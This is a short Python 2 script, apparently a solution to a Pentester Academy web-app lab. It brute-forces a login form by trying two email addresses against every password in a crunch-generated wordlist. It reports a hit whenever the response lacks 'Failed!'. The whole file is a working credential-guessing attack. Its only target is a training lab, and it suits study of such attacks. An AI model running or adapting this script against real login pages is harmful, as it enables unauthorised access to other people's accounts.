#!/usr/bin/python

import urllib
from termcolor import colored


U = ["jack@PentesterAcademy.com","admin@PentesterAcademy.com"]
'''
Use The Following Command To Generate wordlist
#crunch 5 5 xyz -o wordlist.txt
'''
p = open('wordlist.txt','r')
P = [x.strip() for x in p.readlines()]
p.close()

url_base = "http://pentesteracademylab.appspot.com/lab/webapp/1"
for UserName in U:
	for Pass in P:
		args = {'email' : UserName, 'password' : Pass}
		url_args = urllib.urlencode(args)
		url_request = urllib.urlopen(url_base+'?'+url_args)
		if url_request.read().find("Failed!") == -1:
			print colored("Login with Username %s ... Password %s ... "%(UserName,Pass),"green")	
			break
		else:			
			print "Login with Username %s ... Password %s ... Failed!"%(UserName,Pass)
